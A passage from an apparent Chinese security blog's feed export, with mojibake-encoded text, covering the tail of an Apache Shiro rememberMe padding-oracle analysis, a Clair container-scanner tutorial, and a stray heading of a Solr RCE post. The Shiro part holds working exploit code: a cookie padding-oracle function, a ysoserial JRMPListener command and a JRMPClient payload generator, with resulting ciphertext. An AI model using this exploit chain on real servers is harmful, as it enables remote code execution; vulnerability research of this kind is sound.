DeleteMe=trueï¼‰</li></ul></li><li><p>å¦‚æœPaddingåˆæ³•</p><ul><li>ä¸æ­£å¸¸ç™»å½•è¡¨ç°ä¸€æ ·</li></ul></li></ul><p>å› æ­¤å­˜åœ¨Oracleï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shiro_decode</span><span class="params">(secret: bytearray, iv: bytearray)</span> -&gt; int:</span></span><br><span class="line">    burp0_url = <span class="string">"http://localhost.com:8000/"</span></span><br><span class="line">    <span class="comment">#åˆæ³•çš„rememberMe</span></span><br><span class="line">    prefix = base64.b64decode(<span class="string">"wM0qqzm72M+..."</span>)</span><br><span class="line"></span><br><span class="line">    base64_ciphertext = base64.b64encode(prefix+iv+secret).decode()</span><br><span class="line">    burp0_cookies = &#123;<span class="string">"rememberMe"</span>: base64_ciphertext&#125;</span><br><span class="line">    logging.info(<span class="string">"Sending secret=&#123;&#125;"</span>.format(secret))</span><br><span class="line">    res=requests.get(burp0_url, cookies=burp0_cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    set_cookie=res.headers.get(<span class="string">'set-cookie'</span>,<span class="string">''</span>)</span><br><span class="line">    logging.info(<span class="string">"Headers &#123;&#125;."</span>.format(set_cookie))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'rememberMe'</span> <span class="keyword">in</span> set_cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="JRMPæ”»å‡»æ­¥éª¤"><a href="#JRMPæ”»å‡»æ­¥éª¤" class="headerlink" title="JRMPæ”»å‡»æ­¥éª¤"></a>JRMPæ”»å‡»æ­¥éª¤</h1><ol><li><p>è‡ªå·±æœåŠ¡å™¨èµ·ä¸€ä¸ªJRMPListenerï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections2 <span class="string">'calc'</span></span><br></pre></td></tr></table></figure></li><li><p>ç”¨paddingç”Ÿæˆå¯†æ–‡ï¼Œpadding oracleè„šæœ¬åœ¨<a href="https://github.com/Anemone95/padding-oracle-attack" target="_blank" rel="noopener">https://github.com/Anemone95/padding-oracle-attack</a></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shiro_padding_oracle</span><span class="params">()</span>:</span></span><br><span class="line">    fake_plain=get_deserialized(<span class="string">"127.0.0.1:1234"</span>)</span><br><span class="line">    print(len(fake_plain))</span><br><span class="line">    iv, secret=encrypt(fake_plain, <span class="number">16</span>)</span><br><span class="line">    print(base64.b64encode(iv+secret))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_deserialized</span><span class="params">(host)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>,</span><br><span class="line">                              <span class="string">'-jar'</span>,</span><br><span class="line">                              <span class="string">'ysoserial.jar'</span>,</span><br><span class="line">                              <span class="string">'JRMPClient'</span>,</span><br><span class="line">                              host],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br></pre></td></tr></table></figure></li><li><p>è¿”å›ç»“æœï¼š</p> <figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2019</span>-<span class="number">08</span>-<span class="number">07</span> <span class="number">17</span>:<span class="number">39</span>:<span class="number">10</span>,<span class="number">651</span> : INFO : poc<span class="variable">.py</span> : encrypt : IV: <span class="number">0</span>f154f913ce794ad2c65ce9c0c2bd19e, Secret: d363571634286d600279fdf124069a65695e1c3338da0d27131b6c9362bece8f10796c1163d0c067713a46063ee25313325cb58eedd5cb62be1ed495bd1550974f008df6486bfd0fe24e5a04bd3fb090f036451821303e6b808034e4392c1225bf5a7a5e3eb9fab7b055c809330f83db7a561a2ac4e95f8d16c9bfbe66b35774c16cbb3089e54b63c4d8f86b490dca0f8f1ac46cd4ab2b41645b1909b7fdb4a5c21f15033b6f7dc30b3308ee8f2fb5bf220f38355bbfed92be9431a4127034a967f507f8fc582a00dae5c013263507cb54b08694cba7ef998145147ce8419cc5a665462c2d3b91fb259629d2289e31e9d3c407a02d382df90ac62a7c1b35b08767cbe3541a74987280dff8a541aa20b700000000000000000000000000000000</span><br><span class="line">b'DxVPkTznlK0sZc6cDCvRntNjVxY0KG1gAnn98SQGmmVpXhwzONoNJxMbbJNivs6PEHlsEWPQwGdxOkYGPuJTEzJctY7t1ctivh7Ulb0VUJdPAI32SGv9D+JOWgS9P7CQ8DZFGCEwPmuAgDTkOSwSJb9ael4+ufq3sFXICTMPg9t6VhoqxOlfjRbJv75ms1d0wWy7MInlS2PE2PhrSQ3KD48axGzUqytBZFsZCbf9tKXCHxUDO299wwszCO6PL7W/Ig84NVu/<span class="number">7</span>ZK+lDGkEnA0qWf1B/j8WCoA2uXAEyY1B8tUsIaUy6fvmYFFFHzoQZzFpmVGLC07kfsllinSKJ4x6dPEB6AtOC35CsYqfBs1sIdny+NUGnSYcoDf+KVBqiC3AAAAAAAAAAAAAAAAAAAAAA=='</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;åŸç†&quot;&gt;&lt;a href=&quot;#åŸç†&quot; class=&quot;headerlink&quot; title=&quot;åŸç†&quot;&gt;&lt;/a&gt;åŸç†&lt;/h1&gt;&lt;p&gt;shiro1.2.5åç§˜é’¥ä¸å†ç¡¬ç¼–ç ï¼Œä½†æ˜¯é‡‡ç”¨CBCåŠ å¯†ä¼šäº§ç”Ÿpadding  oracleæ”»å‡»ï¼Œåˆå› ä¸ºjavaåºåˆ—åŒ–ç»“æ„ä½“åå¯ä»¥åŠ åƒåœ¾å­—ç¬¦ï¼Œæ‰€ä»¥æ”»å‡»èƒ½å¤ŸæˆåŠŸ&lt;/p&gt;&lt;h1 id=&quot;è§£å¯†æ—¶çš„è°ƒç”¨é“¾&quot;&gt;&lt;a href=&quot;#è§£å¯†æ—¶çš„è°ƒç”¨é“¾&quot; class=&quot;headerlink&quot; title=&quot;è§£å¯†æ—¶çš„è°ƒç”¨é“¾&quot;&gt;&lt;/a&gt;è§£å¯†æ—¶çš„è°ƒç”¨é“¾&lt;/h1&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals // ä¸è®ºå“ªä¸ªå¼‚å¸¸éƒ½ä¼šè¿”å›nullï¼Œä¸Šå±‚302è·³è½¬&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  org.apache.shiro.mgt.AbstractRememberMeManager#decrypt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      org.apache.shiro.crypto.JcaCipherService#decrypt(byte[] encrypted, byte[] key, byte[] iv)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        org.apache.shiro.crypto.JcaCipherService#crypt(byte[] encrypted, byte[] key, byte[] iv, int MODE):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          org.apache.shiro.crypto.JcaCipherService#crypt(javax.crypto.Cipher, byte[] encrypted):459 //throw Unable to execute &#39;doFinal&#39; with cipher instance&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            javax.crypto.Cipher#doFinal(byte[] encrypted)  //this=(key+iv+mode) // jce.jaråŒ… è°ƒè¯•ç›´æ¥åœ¨è¿™ä¸‹æ–­ç‚¹&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              com.sun.crypto.provider.AESCipher#engineDoFinal(byte[] encrypted, startIdx, len)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                com.sun.crypto.provider.CipherCore#doFinal(byte[] encrypted, startIdx, len)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  com.sun.crypto.provider.CipherCore#fillOutputBuffer(encrypted, startIdx, iv, startIdx, len, encrypted)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    com.sun.crypto.provider.CipherCore#unpad(len, decrypted)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      com.sun.crypto.provider.PKCS5Padding#unpad(decrypted, startIdx, len)  // throw BadPaddingException&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  org.apache.shiro.mgt.AbstractRememberMeManager#deserialize(serialized)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    org.apache.shiro.io.DefaultSerializer#deserialize(serialized) // invalid stream header&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Webå®‰å…¨" scheme="http://anemone.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Shiro" scheme="http://anemone.top/tags/Shiro/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="http://anemone.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Java" scheme="http://anemone.top/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Clairåˆæ¢</title>
    <link href="http://anemone.top/container-Clair%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/container-Clairåˆæ¢/</id>
    <published>2019-11-16T08:12:49.000Z</published>
    <updated>2019-11-24T07:58:54.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Clairç®€ä»‹"><a href="#Clairç®€ä»‹" class="headerlink" title="Clairç®€ä»‹"></a>Clairç®€ä»‹</h1><p>clairæ˜¯CoreOSå…¬å¸å¼€æºçš„ä¸€å¥—é’ˆå¯¹å®¹å™¨å®‰å…¨æ€§æ£€æµ‹å·¥å…·ï¼Œä¸»è¦ç”¨äºå‘æ˜å®¹å™¨ä¸­ä½¿ç”¨çš„ç»„ä»¶æ˜¯å¦å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ã€‚</p><p>GitHubé¡¹ç›®åœ°å€ï¼š <a href="https://github.com/quay/clair" target="_blank" rel="noopener">https://github.com/quay/clair</a> </p><h1 id="Clair-Framework"><a href="#Clair-Framework" class="headerlink" title="Clair Framework"></a>Clair Framework</h1><h2 id="æœ¯è¯­"><a href="#æœ¯è¯­" class="headerlink" title="æœ¯è¯­"></a>æœ¯è¯­</h2><ul><li>Ancestryâ€”â€”è¡¨ç¤ºå®¹å™¨</li><li>Featureâ€”â€”å®¹å™¨ä¸­ä»»ä½•å…·æœ‰è„†å¼±æ€§çš„å®ä½“ï¼Œå¦‚è½¯ä»¶åŒ…å’Œæ–‡ä»¶</li><li>Feature Namespaceâ€”â€”Featureæ‰€åœ¨çš„ä¸Šä¸‹æ–‡ï¼Œå¦‚æ“ä½œç³»ç»Ÿå’Œç¼–ç¨‹è¯­è¨€</li><li>Vulnerability Sourceâ€”â€”Clairä¸­ç”¨æ¥è·Ÿè¸ªä¸Šæœ‰æ¼æ´æ•°æ®åº“ï¼ˆå¦‚CVEï¼‰çš„ç»„ä»¶</li><li>Vulnerability Metadata Sourceâ€”â€”æ¼æ´å…ƒæ•°æ®ï¼Œç”¨æ¥å…³è”ä¸Šæ¸¸æ¼æ´æ•°æ®å’ŒClairæ•°æ®åº“</li></ul><a id="more"></a><h2 id="Detector"><a href="#Detector" class="headerlink" title="Detector"></a>Detector</h2><ul><li>DataDectorï¼š ç”¨æ¥æ£€æµ‹å®¹å™¨ç±»å‹ï¼ˆé™¤äº†dockerè¿˜æœ‰appcï¼‰</li><li>FeaturesDectorï¼šå‘æ˜å®¹å™¨ä¸­ä½¿ç”¨çš„ç»„ä»¶</li><li>NamespaceDetectorï¼šç”¨æ¥å‘½åç©ºé—´ä¸­å­˜åœ¨çš„å®‰å…¨æ€§é—®é¢˜</li></ul><h2 id="Updaters-amp-Notifiers"><a href="#Updaters-amp-Notifiers" class="headerlink" title="Updaters &amp; Notifiers"></a>Updaters &amp; Notifiers</h2><ul><li>updatersï¼šç”¨æ¥ä»æ¼æ´åº“é‡Œè·å–æ¼æ´ä¿¡æ¯</li><li>Notifierï¼šç”¨æ¥é€šçŸ¥ç”¨æˆ·å®‰å…¨é—®é¢˜ï¼ŒåŒæ—¶æ”¯æŒwebhook</li></ul><h2 id="Datastore"><a href="#Datastore" class="headerlink" title="Datastore"></a>Datastore</h2><p>ä¸»è¦ç”¨æ¥å­˜å‚¨æ¼æ´æ•°æ®</p><h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><h2 id="å®‰è£…ï¼ˆServerï¼‰"><a href="#å®‰è£…ï¼ˆServerï¼‰" class="headerlink" title="å®‰è£…ï¼ˆServerï¼‰"></a>å®‰è£…ï¼ˆServerï¼‰</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir clair_config</span><br><span class="line">curl -L https://raw.githubusercontent.com/coreos/clair/master/config.yaml.sample -o <span class="variable">$PWD</span>/clair_config/config.yaml</span><br><span class="line">docker run -d -e POSTGRES_PASSWORD=<span class="string">""</span> -p 5432:5432 postgres:9.6</span><br><span class="line">docker run --net=host -v <span class="variable">$PWD</span>/clair_config:/config quay.io/coreos/clair:latest -config=/config/config.yaml <span class="comment"># é€‰æ‹©ç¨³å®šçš„ç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure><p>éªŒè¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET -I http://<span class="variable">$&#123;docker-host&#125;</span>:6061/health</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: clair</span><br><span class="line">Date: Sat, 16 Nov 2019 12:39:46 GMT</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å¯åŠ¨éœ€è¦åŒæ­¥æ•°æ®åº“ï¼Œå¦‚æœåœ¨å›½å†…éœ€è¦ç­‰å¾…æ›´é•¿æ—¶é—´ï¼Œæ›´æ–°å®Œæ¯•åå¯ä»¥çœ‹åˆ°å¦‚ä¸‹è¾“å‡ºï¼š</p><p><img src="/container-Clairåˆæ¢/image-20191117195355945.png" alt="image-20191117195355945"></p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>åˆšåˆšå¯åŠ¨çš„Clairåªæ˜¯ä¸€ä¸ªAPI Serverï¼Œå…·ä½“APIå¯ä»¥å‚è€ƒ <a href="https://app.swaggerhub.com/apis/coreos/clair/3.0" target="_blank" rel="noopener">https://app.swaggerhub.com/apis/coreos/clair/3.0</a> ï¼Œè¦ä½¿ç”¨å®ƒæ‰«æ<strong>æœ¬åœ°å®¹å™¨</strong>å¯ä»¥ä½¿ç”¨<a href="https://github.com/coreos/analyze-local-images" target="_blank" rel="noopener">analyze-local-images</a>ï¼Œç„¶è€ŒClairè®¤ä¸ºæ‰«ææœ¬åœ°å®¹å™¨ä¸æ˜¯å€¼å¾—æå€¡çš„å®è·µï¼Œå› æ­¤è¿™ä¸ªé¡¹ç›®å°±è¢«åºŸå¼ƒæ‰äº†ï¼ˆå…¶åŸç†æ˜¯æœ¬åœ°å¯åŠ¨ä¸€ä¸ªdockerhubæœåŠ¡ï¼Œä½†æ˜¯ç”±äºdockerç‰ˆæœ¬é—®é¢˜å¦‚ä»Šå·²æ— æ³•ä½¿ç”¨ï¼‰ï¼Œä½†æ˜¯ç±»ä¼¼çš„Clientè¿˜æœ‰å¾ˆå¤šï¼Œåœ¨ <a href="https://github.com/quay/clair/blob/master/Documentation/integrations.md" target="_blank" rel="noopener">https://github.com/quay/clair/blob/master/Documentation/integrations.md</a> ä¸Šå¯ä»¥çœ‹åˆ°ï¼Œæ¯”å¦‚<a href="https://github.com/yebinama/paclair" target="_blank" rel="noopener">paclair</a>ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†å…¬æœ‰/ç§æœ‰dockerä»“åº“ä¸­çš„é•œåƒä¸Šä¼ åˆ°clairæ‰«æï¼Œä¸‹é¢å°±ä»¥å®ƒä¸ºä¾‹ï¼Œè¯´æ˜Clairä½¿ç”¨æ–¹æ³•ã€‚</p><p>å®‰è£…paclairå¾ˆç®€å•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install paclair</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éœ€è¦åˆ›å»ºpaclairé…ç½®ï¼ˆGitHubä¸Šè¿˜æœ‰å…¶ä»–ä»“åº“çš„é…ç½®ï¼‰ï¼š</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">General:</span></span><br><span class="line">  <span class="attr">clair_url:</span> <span class="string">'http://docker.test:6060'</span></span><br><span class="line"><span class="attr">Plugins:</span></span><br><span class="line">  <span class="attr">Docker:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">paclair.plugins.docker_plugin.DockerPlugin</span></span><br><span class="line">    <span class="attr">registries:</span></span><br><span class="line">      <span class="attr">hub.docker.com:</span></span><br><span class="line">        <span class="attr">auth:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"anemone95"</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"***"</span></span><br></pre></td></tr></table></figure><p>å‡è®¾é…ç½®æ–‡ä»¶ä¿å­˜ä¸º<code>paclair.yml</code>ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸Šä¼ dockerå¹¶å¯åŠ¨æ‰«æ<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">paclair --debug --conf paclair.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> push <span class="comment"># å°†dockerhubä¸Šçš„é•œåƒä¸Šä¼ åˆ°Clair</span></span><br><span class="line">paclair --conf paclair.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> analyse --output-format html 2&gt;result.html <span class="comment"># æ‰«æäº§ç”Ÿhtmlçš„æŠ¥å‘Š</span></span><br><span class="line">paclair --conf conf/conf.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> delete <span class="comment"># åˆ é™¤å®¹å™¨</span></span><br></pre></td></tr></table></figure></p><p>äº§ç”Ÿçš„æŠ¥å‘Šå¦‚ä¸‹(testä¸Šçš„å®¹å™¨å®é™…ä¸Šæ˜¯<code>medicean/vulapps:s_struts2_s2-037</code>ï¼š</p><p><img src="/container-Clairåˆæ¢/image-20191117172303850.png" alt="image-20191117172303850"></p><p>struts2æ²¡æ‰¾åˆ°æ¼æ´ï¼Œæ¢ä¸ªssh(CVE-2017-1000117)çœ‹çœ‹ï¼Œè¿™å›æˆ‘ä»¬å¯¼å‡ºjsonæ ¼å¼çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paclair --debug --conf paclair.yml Docker medicean/vulapps:s_ssh_1 push</span><br><span class="line">paclair --conf paclair.yml Docker medicean/vulapps:s_ssh_1 analyse 2&gt;ssh.json</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‰¾åˆ°äº†ï¼š</p><p><img src="/container-Clairåˆæ¢/image-20191124155822590.png" alt="image-20191124155822590"></p><h1 id="æŠ¥å‘Šåˆ†æ"><a href="#æŠ¥å‘Šåˆ†æ" class="headerlink" title="æŠ¥å‘Šåˆ†æ"></a>æŠ¥å‘Šåˆ†æ</h1><p>å¯ä»¥çœ‹åˆ°å›¾ç‰‡ä¸Šï¼ŒæŠ¥å‘Šä¸­å±•ç¤ºäº†å®¹å™¨ä¸­ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œå¦‚gccï¼Œ unzipï¼Œopensslï¼Œå¹¶ä¸”ç»™å‡ºäº†å®‰å…¨ç­‰çº§ï¼Œå½“å‰ç‰ˆæœ¬å’Œä¿®å¤ç‰ˆæœ¬ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥çœ‹åˆ°å…¶ä¸è¶³ï¼š</p><ul><li>å¯¹åº”ç”¨ç»„ä»¶çš„æ£€æµ‹èƒ½åŠ›ä¸è¶³ï¼Œå¦‚æµ‹è¯•é•œåƒçš„ä¸»è¦é—®é¢˜åœ¨äºä½ç‰ˆæœ¬strutsï¼Œä½†æ˜¯å…¶æ²¡æœ‰æ£€æµ‹åˆ°</li><li>åªæ˜¯ç®€å•å¯¹æ¯”å…¶ç»„ä»¶hashï¼Œè€Œæ²¡æœ‰æ›´æ·±å…¥çš„æ£€æµ‹ï¼Œå¦‚å³ä½¿æ˜¯ä½¿ç”¨äº†gccï¼Œä½†æ˜¯å®¹å™¨æš´æ¼åœ¨å¤–éƒ¨çš„éƒ¨åˆ†å¹¶æ²¡æœ‰ç”¨ï¼Œé‚£ä¹ˆå®é™…ä¸Šæ”»å‡»è€…æ˜¯æ— æ³•åˆ©ç”¨çš„ï¼›åˆæ¯”å¦‚ç©ºå¯†ç çš„redisï¼Œä½¿ç”¨hashæ¯”è¾ƒæ˜¯æ²¡æ³•æµ‹å‡ºæ¥çš„ã€‚</li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>Clairæ˜¯ä¸€æ¬¾ç”¨æ¥æ‰«æå®¹å™¨ä¸­ä½¿ç”¨ç¬¬ä¸‰æ–¹ä¸å®‰å…¨ç»„ä»¶çš„å·¥å…·ï¼Œèƒ½å¤Ÿå°†å®¹å™¨åˆ†å±‚æ‰«æï¼ŒåŒ¹é…CVEï¼ŒUbuntuï¼ŒRedhatç­‰å¤šä¸ªæ•°æ®åº“ï¼Œä¸ªäººæ„Ÿè§‰æœ‰ä»¥ä¸‹ä¼˜ç¼ºç‚¹ï¼š</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>å¼€æºæ ¸å¿ƒæ¨¡å—ï¼Œæ–¹ä¾¿äºŒæ¬¡å¼€å‘</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>Clientä½¿ç”¨å¤æ‚ï¼Œå®˜æ–¹ç»™å‡ºçš„clientâ€”â€”analyze-local-imageså·²ç»åœæ­¢ç»´æŠ¤ï¼Œæ›´å¼ºå¤§çš„clientéœ€è¦ä»˜è´¹ä½¿ç”¨ï¼Œè€Œå…¶ä»–ç¬¬ä¸‰æ–¹çš„clientä¸ä¸€å®šèƒ½æŒç»­ç»´æŠ¤</li><li>æ–‡æ¡£ä¸å…¨ï¼ŒGitHubä¸»é¡µçš„quickstartéƒ½æœ‰å‘ï¼Œè€Œä¸”æ›´å¤šé…ç½®æ²¡æœ‰è¯´æ˜</li><li>å¯¹åº”ç”¨ç»„ä»¶çš„æ£€æµ‹èƒ½åŠ›ä¸è¶³</li><li>æ£€æµ‹é€»è¾‘ç®€å•ï¼Œå­˜åœ¨æ¼æŠ¥å’Œè¯¯æŠ¥</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Clairç®€ä»‹&quot;&gt;&lt;a href=&quot;#Clairç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;Clairç®€ä»‹&quot;&gt;&lt;/a&gt;Clairç®€ä»‹&lt;/h1&gt;&lt;p&gt;clairæ˜¯CoreOSå…¬å¸å¼€æºçš„ä¸€å¥—é’ˆå¯¹å®¹å™¨å®‰å…¨æ€§æ£€æµ‹å·¥å…·ï¼Œä¸»è¦ç”¨äºå‘æ˜å®¹å™¨ä¸­ä½¿ç”¨çš„ç»„ä»¶æ˜¯å¦å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ã€‚&lt;/p&gt;&lt;p&gt;GitHubé¡¹ç›®åœ°å€ï¼š &lt;a href=&quot;https://github.com/quay/clair&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/quay/clair&lt;/a&gt; &lt;/p&gt;&lt;h1 id=&quot;Clair-Framework&quot;&gt;&lt;a href=&quot;#Clair-Framework&quot; class=&quot;headerlink&quot; title=&quot;Clair Framework&quot;&gt;&lt;/a&gt;Clair Framework&lt;/h1&gt;&lt;h2 id=&quot;æœ¯è¯­&quot;&gt;&lt;a href=&quot;#æœ¯è¯­&quot; class=&quot;headerlink&quot; title=&quot;æœ¯è¯­&quot;&gt;&lt;/a&gt;æœ¯è¯­&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Ancestryâ€”â€”è¡¨ç¤ºå®¹å™¨&lt;/li&gt;
&lt;li&gt;Featureâ€”â€”å®¹å™¨ä¸­ä»»ä½•å…·æœ‰è„†å¼±æ€§çš„å®ä½“ï¼Œå¦‚è½¯ä»¶åŒ…å’Œæ–‡ä»¶&lt;/li&gt;
&lt;li&gt;Feature Namespaceâ€”â€”Featureæ‰€åœ¨çš„ä¸Šä¸‹æ–‡ï¼Œå¦‚æ“ä½œç³»ç»Ÿå’Œç¼–ç¨‹è¯­è¨€&lt;/li&gt;
&lt;li&gt;Vulnerability Sourceâ€”â€”Clairä¸­ç”¨æ¥è·Ÿè¸ªä¸Šæœ‰æ¼æ´æ•°æ®åº“ï¼ˆå¦‚CVEï¼‰çš„ç»„ä»¶&lt;/li&gt;
&lt;li&gt;Vulnerability Metadata Sourceâ€”â€”æ¼æ´å…ƒæ•°æ®ï¼Œç”¨æ¥å…³è”ä¸Šæ¸¸æ¼æ´æ•°æ®å’ŒClairæ•°æ®åº“&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="container" scheme="http://anemone.top/categories/container/"/>
    
    
      <category term="å®¹å™¨å®‰å…¨" scheme="http://anemone.top/tags/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
      <category term="docker" scheme="http://anemone.top/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Solr DataImportHandler RCE(CVE-2019-0193)æ¼æ´åˆ†æ</title>
    <link href="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/"/>
    <id>http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/</id>
    <published>2019-11-03T12:30:49.000Z</published>
    <updated>2019-11-23T02:36:05.576Z</updated>
    
